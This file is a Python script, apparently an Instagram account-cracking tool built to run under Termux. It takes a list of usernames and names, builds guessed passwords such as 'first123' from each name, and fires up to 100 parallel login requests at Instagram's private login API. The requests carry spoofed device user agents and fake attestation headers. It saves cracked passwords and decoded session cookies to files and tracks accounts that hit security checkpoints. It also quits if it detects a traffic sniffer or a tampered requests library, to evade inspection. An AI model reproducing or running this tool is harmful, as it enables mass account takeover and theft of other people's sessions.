import requests
import uuid
import time
import re
import json
import base64
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor as tred

# Color codes
W = '\033[1;37m'  # White
G = '\033[1;32m'  # Green
Y = '\033[1;33m'  # Yellow
RR = '\033[1;31m'  # Red
PP = '\033[1;35m'  # Purple

# Global variables
bkas = []
oks = []
cps = []
loop = 0
method = []
password = []

def linex():
    print(f"    {W}--------------------------------------------")

def clear():
    os.system("clear")

modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f"pip install {module}")
sdcard_permission = '/storage/emulated/0';rm_permission = '/data/data/com.termux/files/usr/bin/rm';pkg_permission = '/data/data/com.termux/files/usr/bin/pkg';pip_permission = '/data/data/com.termux/files/usr/bin/pip';pip3_permission = '/data/data/com.termux/files/usr/bin/pip3'
def trigger_shutdown():
    print("Congratulations!")
    linex()
    sys.exit(1)
def read_file_safe(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        return ""
def security_checks():
    suspicious_words = ["print", "lambda", "zlib.decompress"]
    try:
        import requests
        req_path = getattr(requests, "__file__", None)
        if req_path:
            req_dir = os.path.dirname(req_path)
            candidates = [
                os.path.join(req_dir, "api.py"),
                os.path.join(req_dir, "models.py"),
                os.path.join(req_dir, "sessions.py"),
            ]
        else:
            candidates = []
    except Exception:
        candidates = []
    extra_modules = []
    for mod_name in ("api", "models", "sessions"):
        try:
            mod = __import__(mod_name)
            mod_file = getattr(mod, "__file__", None)
            if mod_file:
                extra_modules.append(mod_file)
        except Exception:
            pass
    files_to_check = list(dict.fromkeys(candidates + extra_modules))
    for path in files_to_check:
        body = read_file_safe(path)
        if not body:
            continue
        for word in suspicious_words:
            if word in body:
                trigger_shutdown()
    termux_requests_paths = [
        "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py",
        "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py",
        "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py"
    ]
    for path in termux_requests_paths:
        if os.path.exists(path):
            body = read_file_safe(path)
            if "print" in body:
                trigger_shutdown()
    httpcanary_paths = [
        "/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png",
        "/storage/emulated/0/Android/data/com.guoshi.httpcanary"
    ]
    for path in httpcanary_paths:
        if os.path.exists(path):
            trigger_shutdown()

def random_instagram_user_agent():
    ig_versions = [
        "361.0.0.46.88",
        "360.1.0.43.89",
        "359.0.0.45.90",
        "358.0.0.41.92",
        "357.0.0.39.93"
    ]
    android_versions = [
        "26/8.0.0", "27/8.1.0", "28/9",
        "29/10", "30/11", "31/12", "32/13"
    ]
    devices = [
        # Samsung
        ("samsung", "SM-A505F", "a50", "exynos9610"),
        ("samsung", "SM-G991B", "o1s", "exynos2100"),

        # Google Pixel
        ("Google", "Pixel 4", "flame", "sm8150"),
        ("Google", "Pixel 6", "oriole", "gs101"),

        # Xiaomi
        ("Xiaomi", "Redmi Note 9", "merlin", "mt6768"),
        ("Xiaomi", "Redmi 12", "fire", "mt6769"),

        # OPPO
        ("OPPO", "CPH1909", "OP4F7L1", "mt6771"),
        ("OPPO", "CPH2387", "OP52FL", "sm6225"),

        # Vivo
        ("vivo", "V2027", "Y20", "mt6765"),
        ("vivo", "V2239", "Y27", "mt6769"),

        # Realme
        ("realme", "RMX1911", "RMX1911", "sdm665"),
        ("realme", "RMX3491", "RE54ABL1", "mt6769"),

        # Infinix
        ("Infinix", "X6810", "Infinix-X6810", "mt6769"),
        ("Infinix", "X6837", "X6837", "mt6769"),

        # Tecno
        ("TECNO", "KG5k", "TECNO-KG5k", "mt6769"),
        ("TECNO", "CH6n", "CH6n", "mt6769"),

        # Nokia
        ("Nokia", "G21", "G21", "Unisoc-T606"),
        ("Nokia", "C31", "C31", "Unisoc-SC9863A"),

        # Motorola
        ("motorola", "moto g34", "fogos", "sm6375"),
        ("motorola", "moto e13", "penang", "Unisoc-T606"),

        # OnePlus
        ("OnePlus", "LE2113", "OnePlus9", "sm8350"),

        # Huawei
        ("HUAWEI", "Y9a", "FRL-L22", "kirin810"),

        # Sony
        ("Sony", "XQ-AS52", "pdx215", "sm8350")
    ]
    dpi = random.choice(["320dpi", "400dpi", "420dpi", "440dpi", "480dpi"])
    resolution = random.choice(["720x1600", "1080x2278", "1080x2400", "1440x3200"])
    locale = random.choice(["en_US", "en_GB", "bn_BD", "hi_IN", "ar_AE"])
    brand, model, device, cpu = random.choice(devices)
    ua = (
        f"Instagram {random.choice(ig_versions)} "
        f"Android ({random.choice(android_versions)}; "
        f"{dpi}; {resolution}; "
        f"{brand}; {model}; {device}; {cpu}; "
        f"{locale}; {random.randint(100000000, 999999999)})"
    )
    return ua

def ____banner____():
    if "win" in sys.platform:
        os.system("cls")
    else:
        os.system("clear")
    print(f"""{G}
               ▄▖▖ ▖▄▖▄▖▄▖  
               ▐ ▛▖▌▚ ▐ ▌▌  
               ▟▖▌▝▌▄▌▐ ▛▌  
              {W}
    +------------------------------------------+
    | OWNER   {Y}: {W}GS SHIV                        |
    | TOOLS  {Y} : {W}IG-FILE                        |
    | VERSION{Y} : {W}V{Y}-{RR}2{W}                            |
    +------------------------------------------+""")

def __jihad__():
    ____banner____()
    print(f'    {W}[{G}A{W}] {G}Instagram File');linex()
    __Jihad__ = input(f'    {W}[{G}✓{W}] {G}Choice {W}: {Y}')
    if __Jihad__ in ['A','a','01','1']:__File__()
    else:print(f'\n[×]  {RR} Choose Value Option... ');__Jihad__()

def __File__():
    ____banner____()
    file = input(f'{RR}{G}     Put File {Y}: {G}');linex()
    try:fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f"{RR}     File not found! Please check the file path.")
        __File__()
        return
    limit = int(input(f'{RR}{G}     Total Password Limit{Y} : {G}'));linex()
    for z in range(limit):
        print(f'{RR}{G}     Example{Y} :{G} firstlast,first123,etc')
        password.append(input(f'{RR}{G}     Password No.{z+1} {Y}: {G}'));linex()
    print(f'{RR}{G}     Example {Y}: {G}M1-(✓)M2-M3-M4-M5');linex()
    server = input(f'{RR}{G}     Put Method{Y} : {G} ');linex()
    if server in ['1','a','A']:method.append('mA') 
    with tred(max_workers=100) as Bng_xd:
        tl = str(len(fo))
        ____banner____()
        print(f"{RR}{G}     Total Id From Crack {Y}: {G} {tl}{W}")
        print(f"{RR}{G}     Use Airplane Mod For Good Result{G}")
        linex()
        for user in fo:
            try:
                ids,names = user.split('|')
            except ValueError:
                #print(f"{RR}Invalid line format in file: {user}")
                #print("Expected format: username|name")
                continue               
            passlist = password
            if "mA" in method:Bng_xd.submit(___FILE__M1,ids,names,passlist)
    print(f'{RR}{G}     The Process Has Been Completed')
    print(f'{RR}{G}     Total Ok {Y} : {G} {str(len(oks))}')
    print(f'{RR}{G}     Total Cp  {Y}: {RR} {str(len(cps))}{W}')
    print(f'{RR}{G}     Thanks For Using My Tool')
    linex()

def ___FILE__M1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r     {W}[{G}I-G{Y}-{G}M1{W}]{Y} - {W}[{PP}{loop}{W}] {Y}- {W}[{G}OK {Y}- {G}{len(oks)}{W}]')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            device_id = str(uuid.uuid4())
            fevice_id = str(uuid.uuid4())
            session = requests.session()
            android = 'android-' + f'{uuid.uuid4()}'.replace('-', '')[:16]
            data = {
                'params': json.dumps({
                    "client_input_params": {
                        "sim_phones": [],
                        "aymh_accounts": [],
                        "secure_family_device_id": "",
                        "has_granted_read_contacts_permissions": 0,
                        "auth_secure_device_id": "",
                        "has_whatsapp_installed": 0,
                        "password": f"#PWD_INSTAGRAM:0:{str(time.time())}:{pas}",
                        "sso_token_map_json_string": "",
                        "block_store_machine_id": "",
                        "ig_vetted_device_nonces": None,
                        "cloud_trust_token": None,
                        "event_flow": "login_manual",
                        "password_contains_non_ascii": "false",
                        "client_known_key_hash": "",
                        "encrypted_msisdn": "",
                        "has_granted_read_phone_permissions": 0,
                        "app_manager_id": "",
                        "should_show_nested_nta_from_aymh": 0,
                        "device_id": android,
                        "zero_balance_state": "",
                        "login_attempt_count": 1,
                        "machine_id": "aL-jeQABAAHuZX-1WgWpgfuBcM0L",
                        "flash_call_permission_status": {
                            "READ_PHONE_STATE": "DENIED",
                            "READ_CALL_LOG": "DENIED",
                            "ANSWER_PHONE_CALLS": "DENIED"
                        },
                        "accounts_list": [],
                        "family_device_id": fevice_id,
                        "fb_ig_device_id": [],
                        "device_emails": [],
                        "try_num": 1,
                        "lois_settings": {
                            "lois_token": ""
                        },
                        "event_step": "home_page",
                        "headers_infra_flow_id": "",
                        "openid_tokens": {},
                        "contact_point": str(ids)
                    },
                    "server_params": {
                        "should_trigger_override_login_2fa_action": 0,
                        "is_vanilla_password_page_empty_password": 0,
                        "is_from_logged_out": 0,
                        "should_trigger_override_login_success_action": 0,
                        "login_credential_type": "none",
                        "server_login_source": "login",
                        "waterfall_id": str(uuid.uuid4()),
                        "two_step_login_type": "one_step_login",
                        "login_source": "Login",
                        "is_platform_login": 0,
                        "INTERNAL__latency_qpl_marker_id": 36707139,
                        "is_from_aymh": 0,
                        "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                        "is_from_landing_page": 0,
                        "password_text_input_id": "g2qm8:83",
                        "is_from_empty_password": 0,
                        "is_from_msplit_fallback": 0,
                        "ar_event_source": "login_home_page",
                        "qe_device_id": device_id,
                        "username_text_input_id": "g2qm8:82",
                        "layered_homepage_experiment_group": None,
                        "device_id": android,
                        "INTERNAL__latency_qpl_instance_id": 2.700166400291E12,
                        "reg_flow_source": "login_home_native_integration_point",
                        "is_caa_perf_enabled": 1,
                        "credential_type": "password",
                        "is_from_password_entry_page": 0,
                        "caller": "gslr",
                        "family_device_id": None,
                        "is_from_assistive_id": 0,
                        "access_flow_version": "pre_mt_behavior",
                        "is_from_logged_in_switcher": 0
                    }
                }),
                'bk_client_context': json.dumps({
                    "bloks_version": "16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf",
                    "styles_id": "instagram"
                }),
                'bloks_versioning_id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
            }

            headers = {
                'User-Agent': random_instagram_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded; application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-app-locale': 'en_US',
                'x-ig-device-locale': 'en_US',
                'x-ig-mapped-locale': 'en_US',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                'x-pigeon-rawclienttime': str(time.time()),
                'x-ig-bandwidth-speed-kbpp': '-1.000',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-bloks-version-id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
                'x-ig-www-claim': '0',
                'x-bloks-prism-button-version': 'CONTROL',
                'x-bloks-prism-colors-enabled': 'false',
                'x-bloks-prism-ax-base-colors-enabled': 'false',
                'x-bloks-prism-font-enabled': 'false',
                'x-ig-attest-params': json.dumps({
                    "attestation": [
                        {
                            "version": 2,
                            "type": "keystore",
                            "errors": [-1013],
                            "challenge_nonce": "VnJXC3S9lD0s65bkMi7tKUoxPEhIvwFY",
                            "signed_nonce": "",
                            "key_hash": ""
                        }
                    ]
                }),
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-device-id': device_id,
                'x-ig-family-device-id': fevice_id,
                'x-ig-android-id': android,
                'x-ig-timezone-offset': '21600',
                'x-ig-nav-chain': f'com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:1:button:{str(time.time())}::',
                'x-fb-connection-type': 'WIFI',
                'x-ig-connection-type': 'WIFI',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-app-id': '567067343352427',
                'priority': 'u=3',
                'accept-language': 'en-US',
                'x-mid': 'aL-jeQABAAHuZX-1WgWpgfuBcM0L',
                'ig-intended-user-id': '0',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
            }
            encoded_data = '&'.join([f'{key}={value}' for key, value in data.items()])
            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
            response = session.post(url, data=encoded_data, headers=headers, allow_redirects=True, timeout=10)            
            if 'logged_in_user' in response.text:
                if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
                    decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
                    cookie_str = ';'.join(f'{k}={v}' for k, v in decoded.items())
                    print(f"\r\033[1;92m     [IG-OK] {ids} | {pas}\n{cookie_str}");linex()
                    with open("/sdcard/IG_FILE-OK.txt", "a") as f:
                        f.write(ids+"|"+pas+"|"+cookie_str+"\n")
                    oks.append(ids)
                    break
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;91m     [IG-CP] {ids} | {pas}")
                with open("/sdcard/IG_FILE-CP.txt", "a") as f:
                    f.write(ids+"|"+pas+"\n")
                cps.append(ids)
                break
            else:
                #print(ids,pas,)
                continue                
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass       
    loop += 1

# End
security_checks()
if __name__ == "__main__":
    os.system('clear')
    __jihad__()
else:
    os.system('clear')
    __jihad__()